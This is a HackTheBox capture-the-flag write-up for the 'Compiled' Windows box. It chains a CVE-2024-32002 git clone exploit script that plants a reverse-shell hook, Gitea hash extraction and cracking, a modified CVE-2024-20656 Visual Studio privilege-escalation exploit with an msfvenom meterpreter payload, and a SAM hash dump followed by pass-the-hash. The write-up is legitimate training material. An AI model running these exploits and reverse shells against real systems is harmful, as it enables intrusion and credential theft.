---
title: Compiled 
published: 2026-02-24 
description: 'An in-detail writeup on how I pwned: Compiled box'
image: './compiled.png'
tags: [hackthebox, windows, medium, CVE-2024-32002] 
category: 'HackTheBox'
draft: false 
---

## User - FootHold 

#### Port `3000 Gitea`, Port `5000` Web App  


* Based on the compiled repo (http://compiled.htb:3000/richard/Compiled) it is using git 2.45 

* When we put our local address in http://compiled.htb:5000/ the header show that it is using git 2.45

```
GET /.git/info/refs?service=git-upload-pack HTTP/1.1
Host: 10.10.10.10
User-Agent: git/2.45.0.windows.1
Accept: */*
Accept-Encoding: deflate, gzip, br, zstd
Pragma: no-cache
Git-Protocol: version=2
```


* This version is vulnerable to `CVE-2024-32002`  
* https://www.tenable.com/plugins/nessus/202262
* https://github.com/amalmurali47/git_rce
* Start local `gitea` container and create new user
* `sudo docker run -p 3000:3000 gitea/gitea`
* Then create repository called exploit and hook

* Git command: `git clone https://github.com/amalmurali47/git_rce` 

* I modified the `create_poc.sh` a bit

```
#!/bin/bash

# set git configuration options
git config --global protocol.file.allow always
git config --global core.symlinks true

# optional
git config --global init.defaultBranch main

git init hook
cd hook
mkdir -p y/hooks

cat > y/hooks/post-checkout <<EOF
#!/bin/bash
powershell -enc <reverse_shell>
EOF

chmod +x y/hooks/post-checkout
# upload to hook repo

git add y/hooks/post-checkout
git commit -m "post-checkout"
git branch -M main
git remote add origin http://10.10.10.22:3000/test/hook.git
git push -u origin main

cd ..
# upload to exploit repo
git init exploit
cd exploit
git submodule add --name x/y http://10.10.10.22:3000/test/hook.git A/modules/x
git commit -m "add-submodule"

# create a symlink
printf ".git" > dotgit.txt
git hash-object -w --stdin < dotgit.txt > dot-git.hash
printf "120000 %s 0\ta\n" "$(cat dot-git.hash)" > index.info
git update-index --index-info < index.info
git commit -m "add-symlink"
git remote add origin http://10.10.10.22:3000/test/exploit.git
git push -u origin main
cd ..
```


* Run: `./create_poc.sh`

* It will asked my `gitea` username and password 

* Then enter it to the `compiled.htb:5000` 

* http://10.10.10.22:3000/exploit.git

* After while I got a reverse shell as user `richad` 

* Next we find emily user, we can try bruteforce emily password hash from gitea.db in c:\program files\gitea\data\gitea.db

### Transfer the gitea.db file

```bash
sqlite3 gitea.db

select * from user;
```

* Format it to hashcat acceptable format.

```
sha256:50000:In2HPMqJEDzYOpdr2sUkhg==:l5BygNwk/lF8Q0db0hi/rVbCXU0RA32LbaRA79TWka3+rUAzCyqmqvHzNiHQ1zIo/BY=
```

* Crack: `hashcat -m 10900 hash.txt rockyou.txt`

 * I found the password `12345678` 

* Then I logged in via `evil-winrm`



## Root - Privilege Escalation

* The author mention about this issue

https://github.com/ruycr4ft/CVE-2024-20656/issues/1

* So the `Expl.exe` has to be executed after the current process is migrated to `explorer.exe`

* Get meterpreter shell and migrate to `explorer.exe` 


```bash
meterpreter > getuid
Server username: COMPILED\Emily
meterpreter > migrate -N explorer.exe

[*] Migrating from 6260 to 5612...
[*] Migration completed successfully
``` 

* Compile the exploit in visual studio

* Set the cmd variable in main.cpp to this 

```C
#include "def.h"
WCHAR cmd[] = L"C:\\Program Files (x86)\\Microsoft Visual Studio\\2019\\community\\team tools\\diagnosticshub\\collector\\VSDiagnostics.exe";
void cb1()

	{                                                                                printf("[*] Oplock!\n");
	while (!Move(hFile2)) {}
    printf("[+] File moved!\n");
    CopyFile(L"c:\\Windows\\Tasks\\reverse.exe", L"C:\\ProgramData\\Microsoft\\VisualStudio\\SetupWMI\\MofCompiler.exe", FALSE);
    finished = TRUE;
}
``` 

* Modify cb1 function to copy your reverse shell instead of cmd.exe

* Generate new reverse shell and upload it to C:\Windows\Tasks\reverse.exe

```
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=tun0 lport=4444 -f exe -o reverse.exe 
``` 

* Run the compiled Expl.exe from migrated meterpreter shell

```bash
meterpreter > shell
Process 5028 created.
Channel 1 created.
Microsoft Windows [Version 10.0.19045.4651]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd /windows/tasks
cd /windows/tasks

C:\Windows\Tasks>dir
dir

 Volume in drive C has no label.
 Volume Serial Number is 352B-98C6
 Directory of C:\Windows\Tasks

07/28/2024  05:31 AM    <DIR>          .
07/28/2024  05:31 AM    <DIR>          ..
07/28/2024  05:31 AM           167,936 Expl.exe
07/28/2024  05:31 AM             7,168 reverse.exe

C:\Windows\Tasks>.\Expl.exe
.\Expl.exe

[+] Junction \\?\C:\3b0d6991-a02e-4922-9c5e-6744d68d0ca4 -> \??\C:\d5a5fe85-726d-4062-babb-c6d056f840da created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0197E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata created!
[+] Junction \\?\C:\3b0d6991-a02e-4922-9c5e-6744d68d0ca4 -> \RPC Control created!
[+] Junction \\?\C:\3b0d6991-a02e-4922-9c5e-6744d68d0ca4 -> \??\C:\d5a5fe85-726d-4062-babb-c6d056f840da created!
[+] Symlink Global\GLOBALROOT\RPC Control\Report.0297E42F-003D-4F91-A845-6404CF289E84.diagsession -> \??\C:\Programdata\Microsoft created!
[+] Junction \\?\C:\3b0d6991-a02e-4922-9c5e-6744d68d0ca4 -> \RPC Control created!
[+] Persmissions successfully reseted!
[*] Starting WMI installer.
[*] Command to execute: C:\windows\system32\msiexec.exe /fa C:\windows\installer\8ad86.msi
[*] Oplock!
[+] File moved!

```

* In another listener I got administrator shell

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 
[*] Sending stage (201798 bytes) to 
[*] Meterpreter session 2 opened (xxxxx:4444 -> xxxx) at 2024-07-28
```

```bash
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f75c95bc9312632edec46b607938061e:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Emily:1001:aad3b435b51404eeaad3b435b51404ee:259745cb123a52aa2e693aaacca2db52:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Richard:1002:aad3b435b51404eeaad3b435b51404ee:f21635b4c33e9ed3ee47dd5b31ff0f92:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:ac8352a8680463c78247b75a023999cc:::


evil-winrm -i compiled.htb -u administrator -H f75c95bc9312632edec46b607938061e 
``` 

